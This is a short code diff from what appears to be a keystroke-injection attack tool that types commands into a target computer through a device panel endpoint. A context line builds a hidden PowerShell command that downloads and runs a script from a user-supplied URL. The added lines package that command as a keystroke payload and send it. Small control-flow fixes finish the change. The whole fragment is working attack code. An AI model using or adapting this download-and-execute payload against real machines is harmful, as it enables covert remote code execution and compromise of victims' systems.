@@ -145,6 +145,11 @@ if __name__ == "__main__":
             args = user_input.split(" ")
             user_input = "powershell -W Hidden -nop -noni -c \"IEX (New-Object Net.Webclient).downloadstring('%s')\"" % args[1]
 
+            # Send the payload
+            user_converted = convert_to_keymap(txt, "CustomDelay:1000\nPrint:%s\nCustomDelay:1000\nPress:176")
+            send_payload(user_converted, results.panel+"/runlivepayload")
+
+
         # Send simple text without using a payload chain
         elif 'send' == user_input.split(' ')[0]:
             # Convert the simple text to keymap
@@ -155,9 +160,10 @@ if __name__ == "__main__":
 
             # Send the payload
             send_payload(user_converted, results.panel+"/runlivepayload")
+            continue
 
         # Send evil command with default payload
-        elif user_input != "":
+        if user_input != "":
 
             # Convert from AZERTY to QWERTY
             user_converted = convert_to_keymap(user_input, payload)
